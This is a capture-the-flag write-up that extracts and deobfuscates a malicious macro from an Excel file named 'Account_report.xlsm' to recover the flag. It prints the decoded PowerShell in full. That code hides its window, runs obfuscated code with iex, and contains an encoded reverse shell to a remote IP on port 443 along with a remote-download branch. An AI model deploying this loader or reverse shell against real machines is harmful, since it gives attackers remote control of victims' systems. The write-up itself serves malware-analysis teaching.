# Decrypting the payload

![](https://i.imgur.com/kCK6cQ2.png)

- The attached file is an `Account_report.xlsm` and in most ctf, an excel file probably has macros that we have to extract

- the tool I used to extract the is olevba tool which is part of the oletools which can be installed using `pip3 install -U oletools` then we can extract the macro using `olevba Account_report.xlsm` which generates a large text that has a lot of hex character so we decode from hex to ascii and we get this script

```powershell
powershell.exe -exec bypass -noexit -w hidden -enc  JAB0ACAAPQAgACcAWwBEAGwAbABJAG0AcABvAHIAdAAoAFwAIgB1AHMAZQByADMAMgAuAGQAbABsAFwAIgApAF0AIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABiAG8AbwBsACAAUwBoAG8AdwBXAGkAbgBkAG8AdwAoAGkAbgB0ACAAaABhAG4AZABsAGUALAAgAGkAbgB0ACAAcwB0AGEAdABlACkAOwAnADsADQAKAGEAZABkAC0AdAB5AHAAZQAgAC0AbgBhAG0AZQAgAHcAaQBuACAALQBtAGUAbQBiAGUAcgAgACQAdAAgAC0AbgBhAG0AZQBzAHAAYQBjAGUAIABuAGEAdABpAHYAZQA7AFsAbgBhAHQAaQB2AGUALgB3AGkAbgBdADoAOgBTAGgAbwB3AFcAaQBuAGQAbwB3ACgAKABbAFMAeQBzAHQAZQBtAC4ARABpAGEAZwBuAG8AcwB0AGkAYwBzAC4AUAByAG8AYwBlAHMAcwBdADoAOgBHAGUAdABDAHUAcgByAGUAbgB0AFAAcgBvAGMAZQBzAHMAKAApACAAfAAgAEcAZQB0AC0AUAByAG8AYwBlAHMAcwApAC4ATQBhAGkAbgBXAGkAbgBkAG8AdwBIAGEAbgBkAGwAZQAsACAAMAApADsADQAKAGkAZQB4ACAAKAAgAFsAUwB0AHIAaQBuAEcAXQA6ADoAagBvAGkAbgAoACcAJwAsACAAKABbAHIARQBHAGUAWABdADoAOgBNAGEAVABjAGgAZQBTACgAIAAiACkAIAAnAHgAJwArAF0AMwAxAFsARABJAGwATABlAEgAcwAkACsAXQAxAFsARABpAEwATABlAGgAcwAkACAAKAAmAHwAIAApADQAMwAxAFsARABJAGwATABlAEgAcwAkACsAXQAxAFsARABpAEwATABlAGgAcwAkACAAKAAmAHwAIAApADQAMwBdAFIAQQBoAGMAWwBdAEcAbgBJAFIAVABzAFsALAAnAHQAWABqACcAKABlAGMAQQBMAFAARQBSAC4AKQAnACQAJwAsACcAdwBxAGkAJwAoAGUAQwBBAEwAUABFAFIALgApACcAOwB0AFgAJwArACcAagBzAGMAMABkAF8AZAAzAGwAYgA0AG4AMwBfADAAcgBjADQAbQAnACsAJwB7AGcAJwArACcAYQAnACsAJwBsAGYAdABYAGoAIAAnACsAJwA9ADEAXwBnAGEAJwArACc
.
.
.
<more chars>
```

- the long string is a base64 encoded string because of two reasons the `-enc` flag in the power shell command and the string ends in == so when we decode it we have this script

```powershell
$.t. .=. .'.[.D.l.l.I.m.p.o.r.t.(.\.".u.s.e.r.3.2...d.l.l.\.".).]. .p.u.b.l.i.c. .s.t.a.t.i.c. .e.x.t.e.r.n. .b.o.o.l. .S.h.o.w.W.i.n.d.o.w.(.i.n.t. .h.a.n.d.l.e.,. .i.n.t. .s.t.a.t.e.).;.'.;.
.
.a.d.d.-.t.y.p.e. .-.n.a.m.e. .w.i.n. .-.m.e.m.b.e.r. .$.t. .-.n.a.m.e.s.p.a.c.e. .n.a.t.i.v.e.;.[.n.a.t.i.v.e...w.i.n.].:.:.S.h.o.w.W.i.n.d.o.w.(.(.[.S.y.s.t.e.m...D.i.a.g.n.o.s.t.i.c.s...P.r.o.c.e.s.s.].:.:.G.e.t.C.u.r.r.e.n.t.P.r.o.c.e.s.s.(.). .|. .G.e.t.-.P.r.o.c.e.s.s.)...M.a.i.n.W.i.n.d.o.w.H.a.n.d.l.e.,. .0.).;.
.
.i.e.x. .(. .[.S.t.r.i.n.G.].:.:.j.o.i.n.(.'.'.,. .(.[.r.E.G.e.X.].:.:.M.a.T.c.h.e.S.(. .".). .'.x.'.+.].3.1.[.D.I.l.L.e.H.s.$.+.].1.[.D.i.L.L.e.h.s.$. .(.&.|. .).4.3.1.[.D.I.l.L.e.H.s.$.+.].1.[.D.i.L.L.e.h.s.$. .(.&.|. .).4.3.].R.A.h.c.[.].G.n.I.R.T.s.[.,.'.t.X.j.'.(.e.c.A.L.P.E.R...).'.$.'.,.'.w.q.i.'.(.e.C.A.L.P.E.R...).'.;.t.X.'.+.'.j.s.c.0.d._.d.3.l.b.4.n.3._.0.r.c.4.m.'.+.'.{.g.'.+.'.a.'.+.'.l.f.t.X.j. .'.+.'.=.1._.g.a.'.+.'.l.f.w.q.i.'.(.".,.'...'.,. .'.R.'.+.'.i.G.H.T.t.O.l.'.+.'.e.f.t.'. .). .|. .f.o.r.E.A.c.H.-.o.B.J.e.c.T. .{.$._...V.A.L.U.E.}. .).). .).;.
.
.S.E.t. .(.".G.8.".+.".h.".). .(. .". .). .).6.3.].R.a.h.c.[.,.'.r.a.Z.'.E.c.a.l.P.e.R.-. .4.3.].R.a.h.c.[.,.).0.5.].R.a.h.c.[.+.8.7.].R.a.h.c.[.+.9.4.].R.a.h.c.[.(. . .e.C.A.l.p.E.R.c.-. . .).'.;.2.'.+.'.N.'.+.'.1.'.+.'.}.s.u.0.r.3.g.'.+.'.n.4.d._.3.r.4.'.+.'._.2.N.1. .=. .2._.g.a.'.+.'.l.f.r.'.+.'.a.Z.'.(.(. .(. .).'.'.n.i.O.j.-.'.x.'.+.].3.,.1.[.).(.G.N.i.r.T.S.o.t...E.c.N.e.r.e.F.e.R.p.E.s.O.B.R.E.v.$. .(. ... .". . .). .;.-.j.O.I.n. .(. .l.S. .(.".V.A.R.".+.".I.a.B.".+.".L.E.:.g.".+.".8.H.".). . .)...V.A.L.u.e.[. .-. .1..... .-. .(. .(. .l.S. .(.".V.A.R.".+.".I.a.B.".+.".L.E.:.g.".+.".8.H.".). . .)...V.A.L.u.e...L.e.n.g.t.H.).]. .|. .I.e.X.
.
.$.p.a.y.l.o.a.d. .=. .".J.A.B.j.A.G.w.A.a.Q.B.l.A.G.4.A.d.A.A.g.A.D.0.A.I.A.B.O.A.G.U.A.d.w.A.t.A.E.8.A.Y.g.B.q.A.G.U.A.Y.w.B.0.A.C.A.A.U.w.B.5.A.H.M.A.d.A.B.l.A.G.0.A.L.g.B.O.A.G.U.A.d.A.A.u.A.F.M.A.b.w.B.j.A.G.s.A.Z.Q.B.0.A.H.M.A.L.g.B.U.A.E.M.A.U.A.B.D.A.G.w.A.a.Q.B.l.A.G.4.A.d.A.A.o.A.C.I.A.M.Q.A.5.A.D.I.A.L.g.A.w.A.C.4.A.M.g.A.u.A.D.E.A.M.w.A.y.A.C.I.A.L.A.A.0.A.D.Q.A.M.w.A.p.A.D.s.A.J.A.B.z.A.H.Q.A.c.g.B.l.A.G.E.A.b.Q.A.g.A.D.0.A.I.A.A.k.A.G.M.A.b.A.B.p.A.G.U.A.b.g.B.0.A.C.4.A.R.w.B.l.A.H.Q.A.U.w.B.0.A.H.I.A.Z.Q.B.h.A.G.0.A.K.A.A.p.A.D.s.A.W.w.B.i.A.H.k.A.d.A.B.l.A.F.s.A.X.Q.B.d.A.C.Q.A.Y.g.B.5.A.H.Q.A.Z.Q.B.z.A.C.A.A.P.Q.A.g.A.D.A.A.L.g.A.u.A.D.Y.A.N.Q.A.1.A.D.M.A.N.Q.B.8.A.C.U.A.e.w.A.w.A.H.0.A.O.w.B.3.A.G.g.A.a.Q.B.s.A.G.U.A.K.A.A.o.A.C.Q.A.a.Q.A.g.A.D.0.A.I.A.A.k.A.H.M.A.d.A.B.y.A.G.U.A.Y.Q.B.t.A.C.4.A.U.g.B.l.A.G.E.A.Z.A.A.o.A.C.Q.A.Y.g.B.5.A.H.Q.A.Z.Q.B.z.A.C.w.A.I.A.A.w.A.C.w.A.I.A.A.k.A.G.I.A.e.Q.B.0.A.G.U.A.c.w.A.u.A.E.w.A.Z.Q.B.u.A.G.c.A.d.A.B.o.A.C.k.A.K.Q.A.g.A.C.0.A.b.g.B.l.A.C.A.A.M.A.A.p.A.H.s.A.O.w.A.k.A.G.Q.A.Y.Q.B.0.A.G.E.A.I.A.A.9.A.C.A.A.K.A.B.O.A.G.U.A.d.w.A.t.A.E.8.A.Y.g.B.q.A.G.U.A.Y.w.B.0.A.C.A.A.L.Q.B.U.A.H.k.A.c.A.B.l.A.E.4.A.Y.Q.B.t.A.G.U.A.I.A.B.T.A.H.k.A.c.w.B.0.A.G.U.A.b.Q.A.u.A.F.Q.A.Z.Q.B.4.A.H.Q.A.L.g.B.B.A.F.M.A.Q.w.B.J.A.E.k.A.R.Q.B.u.A.G.M.A.b.w.B.k.A.G.k.A.b.g.B.n.A.C.k.A.L.g.B.H.A.G.U.A.d.A.B.T.A.H.Q.A.c.g.B.p.A.G.4.A.Z.w.A.o.A.C.Q.A.Y.g.B.5.A.H.Q.A.Z.Q.B.z.A.C.w.A.M.A.A.s.A.C.A.A.J.A.B.p.A.C.k.A.O.w.A.k.A.H.M.A.Z.Q.B.u.A.G.Q.A.Y.g.B.h.A.G.M.A.a.w.A.g.A.D.0.A.I.A.A.o.A.G.k.A.Z.Q.B.4.A.C.A.A.J.A.B.k.A.G.E.A.d.A.B.h.A.C.A.A.M.g.A.+.A.C.Y.A.M.Q.A.g.A.H.w.A.I.A.B.P.A.H.U.A.d.A.A.t.A.F.M.A.d.A.B.y.A.G.k.A.b.g.B.n.A.C.A.A.K.Q.A.7.A.C.Q.A.c.w.B.l.A.G.4.A.Z.A.B.i.A.G.E.A.Y.w.B.r.A.D.I.A.I.A.A.g.A.D.0.A.I.A.A.k.A.H.M.A.Z.Q.B.u.A.G.Q.A.Y.g.B.h.A.G.M.A.a.w.A.g.A.C.s.A.I.A.A.i.A.F.A.A.U.w.A.g.A.C.I.A.I.A.A.r.A.C.A.A.K.A.B.w.A.H.c.A.Z.A.A.p.A.C.4.A.U.A.B.h.A.H.Q.A.a.A.A.g.A.C.s.A.I.A.A.i.A.D.4.A.I.A.A.i.A.D.s.A.J.A.B.z.A.G.U.A.b.g.B.k.A.G.I.A.e.Q.B.0.A.G.U.A.I.A.A.9.A.C.A.A.K.A.B.b.A.H.Q.A.Z.Q.B.4.A.H.Q.A.L.g.B.l.A.G.4.A.Y.w.B.v.A.G.Q.A.a.Q.B.u.A.G.c.A.X.Q.A.6.A.D.o.A.Q.Q.B.T.A.E.M.A.S.Q.B.J.A.C.k.A.L.g.B.H.A.G.U.A.d.A.B.C.A.H.k.A.d.A.B.l.A.H.M.A.K.A.A.k.A.H.M.A.Z.Q.B.u.A.G.Q.A.Y.g.B.h.A.G.M.A.a.w.A.y.A.C.k.A.O.w.A.k.A.H.M.A.d.A.B.y.A.G.U.A.Y.Q.B.t.A.C.4.A.V.w.B.y.A.G.k.A.d.A.B.l.A.C.g.A.J.A.B.z.A.G.U.A.b.g.B.k.A.G.I.A.e.Q.B.0.A.G.U.A.L.A.A.w.A.C.w.A.J.A.B.z.A.G.U.A.b.g.B.k.A.G.I.A.e.Q.B.0.A.G.U.A.L.g.B.M.A.G.U.A.b.g.B.n.A.H.Q.A.a.A.A.p.A.D.s.A.J.A.B.z.A.H.Q.A.c.g.B.l.A.G.E.A.b.Q.A.u.A.E.Y.A.b.A.B.1.A.H.M.A.a.A.A.o.A.C.k.A.f.Q.A.7.A.C.Q.A.Y.w.B.s.A.G.k.A.Z.Q.B.u.A.H.Q.A.L.g.B.D.A.G.w.A.b.w.B.z.A.G.U.A.K.A.A.p.A.D.s.A.".
.
.$.c. .=. .[.S.y.s.t.e.m...T.e.x.t...E.n.c.o.d.i.n.g.].:.:.U.n.i.c.o.d.e...G.e.t.S.t.r.i.n.g.(.[.S.y.s.t.e.m...C.o.n.v.e.r.t.].:.:.F.r.o.m.B.a.s.e.6.4.S.t.r.i.n.g.(.$.p.a.y.l.o.a.d.).).
.
.i.f. .(.$.p.a.y.l.o.a.d. .-.m.a.t.c.h. .".h.t.t.p.:.|.h.t.t.p.s.:.".). .{.
.
. . . . .$.p.a.y.l.o.a.d. .=. .(.N.e.w.-.O.b.j.e.c.t. .".N.e.t...W.e.b.c.l.i.e.n.t.".)...D.o.w.n.l.o.a.d.S.t.r.i.n.g.(.$.p.a.y.l.o.a.d.).;.
.
.}.
.
.i.e.x. .$.c.;.
```

- After cleaning

```powershell
$t = '[DllImport(\"user32dll\")] public static extern bool ShowWindow(int handle, int state);';

add-type -name win -member $t -namespace native;[nativewin]::ShowWindow(([SystemDiagnosticsProcess]::GetCurrentProcess() | Get-Process)MainWindowHandle, 0);

iex ( [StrinG]::join('', ([rEGeX]::MaTcheS( ") 'x'+]31[DIlLeHs$+]1[DiLLehs$ (&| )431[DIlLeHs$+]1[DiLLehs$ (&| )43]RAhc[]GnIRTs[,'tXj'(ecALPER)'$','wqi'(eCALPER)';tX'+'jsc0d_d3lb4n3_0rc4m'+'{g'+'a'+'lftXj '+'=1_ga'+'lfwqi'(",'', 'R'+'iGHTtOl'+'eft' ) | forEAcH-oBJecT {$_VALUE} )) );

SEt ("G8"+"h") ( " ) )63]Rahc[,'raZ'EcalPeR- 43]Rahc[,)05]Rahc[+87]Rahc[+94]Rahc[(  eCAlpERc-  )';2'+'N'+'1'+'}su0r3g'+'n4d_3r4'+'_2N1 = 2_ga'+'lfr'+'aZ'(( ( )''niOj-'x'+]3,1[)(GNirTSotEcNereFeRpEsOBREv$ (  "  ) ;-jOIn ( lS ("VAR"+"IaB"+"LE:g"+"8H")  )VALue[ - 1 - ( ( lS ("VAR"+"IaB"+"LE:g"+"8H")  )VALueLengtH)] | IeX

$payload = "JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAwAC4AMgAuADEAMwAyACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApADsA"

$c = [SystemTextEncoding]::UnicodeGetString([SystemConvert]::FromBase64String($payload))

if ($payload -match "http:|https:") {

    $payload = (New-Object "NetWebclient")DownloadString($payload);

}

iex $c;
```

- if we look closely we can notice these two `sc0d_d3lb4n3_0rc4m'+'{g'+'a'+'lf` and `}su0r3g'+'n4d_3r4'+'_2N1 = 2_ga'+'lf` after reversing the string and cleaning it we get `flag{m4cr0_3n4bl3d_d0cs` and `flag_2 = _4r3_d4ng3r0us}`
- Flag: flag{m4cr0_3n4bl3d_d0cs_4r3_d4ng3r0us}